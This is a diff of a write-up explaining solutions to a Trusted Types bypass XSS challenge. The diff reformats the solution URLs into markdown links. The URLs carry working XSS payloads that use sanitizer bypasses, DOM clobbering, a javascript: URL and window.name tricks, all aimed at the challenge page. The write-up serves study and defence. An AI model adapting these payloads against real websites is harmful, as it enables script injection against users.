@@ -30,7 +30,7 @@ The contruction of above Blob URL is vulnerable to XSS, as dirty input goes insi
 However, the link has `download` attribute specified, which will force it to download instead of rendering. Which will break the rule of this challenge to execute script in the challenge origin.
 But, since an `<a>` tag is allowed in the sanitizer, you can simply pass `<a>` tag with `in_out_link` id, and you can navigate to it without triggering the download.
 
-https://shhnjk.github.io/challenge/tt/TrustedTypesBypassChallenge.html?code=%3Ca%20id=in_out_link%20class=%22%3C/textarea%3E%3Cimg%20src=x%20onerror=alert(origin)%3E%22%3EClick%20me%3C/a%3E
+[https://shhnjk.github.io/challenge/tt/TrustedTypesBypassChallenge.html?code=%3Ca%20id=in_out_link%20class=%22%3C/textarea%3E%3Cimg%20src=x%20onerror=alert(origin)%3E%22%3EClick%20me%3C/a%3E](https://shhnjk.github.io/challenge/tt/TrustedTypesBypassChallenge.html?code=%3Ca%20id=in_out_link%20class=%22%3C/textarea%3E%3Cimg%20src=x%20onerror=alert(origin)%3E%22%3EClick%20me%3C/a%3E)
 
 Wait, but shouldn't Trusted Types block this? Read [this section](https://microsoftedge.github.io/edgevr/posts/eliminating-xss-with-trusted-types/#blob-url) on my blog post for the explanation 😉
 
@@ -74,9 +74,9 @@ But, too early to get happy. The `name` attribute isn't allowed in the sanitizer
 
 Well, in Chrome, you can set the name inside an iframe, and it can be now targeted 😊 So putting all together, following is the solution.
 
-https://shhnjk.github.io/challenge/tt/TrustedTypesBypassChallenge.html?code=%3Ciframe%20src=%22https://vuln.shhnjk.com/xssable.php?xss=%3Cscript%3Ewindow.name=%27blank%27;location.href=%27https://shhnjk.github.io/challenge/tt/parse_html_subset.js%27%3C/script%3E%22%3E&coupon=javascript:alert(origin)
+[https://shhnjk.github.io/challenge/tt/TrustedTypesBypassChallenge.html?code=%3Ciframe%20src=%22https://vuln.shhnjk.com/xssable.php?xss=%3Cscript%3Ewindow.name=%27blank%27;location.href=%27https://shhnjk.github.io/challenge/tt/parse_html_subset.js%27%3C/script%3E%22%3E&coupon=javascript:alert(origin)](https://shhnjk.github.io/challenge/tt/TrustedTypesBypassChallenge.html?code=%3Ciframe%20src=%22https://vuln.shhnjk.com/xssable.php?xss=%3Cscript%3Ewindow.name=%27blank%27;location.href=%27https://shhnjk.github.io/challenge/tt/parse_html_subset.js%27%3C/script%3E%22%3E&coupon=javascript:alert(origin))
 
-BTW, [alex](https://twitter.com/insertScript) came up with a slightly different solution, where he framed 2 pages where one would point to payload page, and another point to `parse_html_subset.js` page with `<iframe>`'s `name` attribute set to `blank`. This was a clever solution 😀
+BTW, [alex](https://twitter.com/insertScript) came up with a slightly different solution. He framed 2 pages where one would point to payload page, and another point to `parse_html_subset.js` page with `<iframe>`'s `name` attribute set to `blank`. This was a clever solution 😀
 
 `data:text/html,<iframe src="https://shhnjk.github.io/challenge/tt/parse_html_subset.js" name="blank"></iframe><iframe height="500" width="500" src="https://shhnjk.github.io/challenge/tt/TrustedTypesBypassChallenge.html?coupon=javascript:alert(origin)"></iframe>`
 
@@ -89,7 +89,7 @@ However, I have added more allowed tags to introduce a bug ([Diff](https://www.d
 
 Therefore, following is the solution.
 
-https://shhnjk.github.io/challenge/tt/TrustedTypesBypassChallenge.html?code=%3Ctemplate%20id=%22contact%22%3E%3Cimg%20src=x%20onerror=alert(origin)%3E%3C/template%3E
+[https://shhnjk.github.io/challenge/tt/TrustedTypesBypassChallenge.html?code=%3Ctemplate%20id=%22contact%22%3E%3Cimg%20src=x%20onerror=alert(origin)%3E%3C/template%3E](https://shhnjk.github.io/challenge/tt/TrustedTypesBypassChallenge.html?code=%3Ctemplate%20id=%22contact%22%3E%3Cimg%20src=x%20onerror=alert(origin)%3E%3C/template%3E)
 
 This bug has nothing to do with Trusted Types, as this sanitizer was allowed by Trusted Types header in the challenge page. But this is just a reminder that a DOM XSS will still be introduced if the sanitizer allowed by a Trusted Types policy is unsafe.
 
@@ -122,7 +122,7 @@ switch (node.nodeType) {
 
 ```
 
-https://shhnjk.github.io/challenge/tt/TrustedTypesBypassChallenge.html?code=%3Cform%20onclick=%22alert(origin);return%20false%22%3E%3Cimg%20id=attributes%3E%3Ca%20href=https://a%3EClick%20here%3C/a%3E
+[https://shhnjk.github.io/challenge/tt/TrustedTypesBypassChallenge.html?code=%3Cform%20onclick=%22alert(origin);return%20false%22%3E%3Cimg%20id=attributes%3E%3Ca%20href=https://a%3EClick%20here%3C/a%3E](https://shhnjk.github.io/challenge/tt/TrustedTypesBypassChallenge.html?code=%3Cform%20onclick=%22alert(origin);return%20false%22%3E%3Cimg%20id=attributes%3E%3Ca%20href=https://a%3EClick%20here%3C/a%3E)
 
 Similarly, [TheGrandPew](https://twitter.com/PewGrand) and [alex](https://twitter.com/insertScript) found out that with a `<form>` tag, they can perform a DOM Clobbering to hide dangerous tags from the sanitizer's parser, when there is an element with `id=childNodes`.
 
@@ -137,7 +137,7 @@ function walk(n, f) {
 }
 ```
 
-https://shhnjk.github.io/challenge/tt/TrustedTypesBypassChallenge.html?code=%3Cform%3E%3Cinput%20id=childNodes%3E%3Cimg%20src=x%20onerror=alert(origin)%3E%3C/form%3E
+[https://shhnjk.github.io/challenge/tt/TrustedTypesBypassChallenge.html?code=%3Cform%3E%3Cinput%20id=childNodes%3E%3Cimg%20src=x%20onerror=alert(origin)%3E%3C/form%3E](https://shhnjk.github.io/challenge/tt/TrustedTypesBypassChallenge.html?code=%3Cform%3E%3Cinput%20id=childNodes%3E%3Cimg%20src=x%20onerror=alert(origin)%3E%3C/form%3E)
 
 These were amazing bugs, and while I could consider these bugs as 5th or 6th bugs, I decided to treat these bugs and the intended sanitizer bypass as 1 bug for the sake of this challenge. However, since these bugs deserve a credit, I made another list for honorable mentions 😊
 
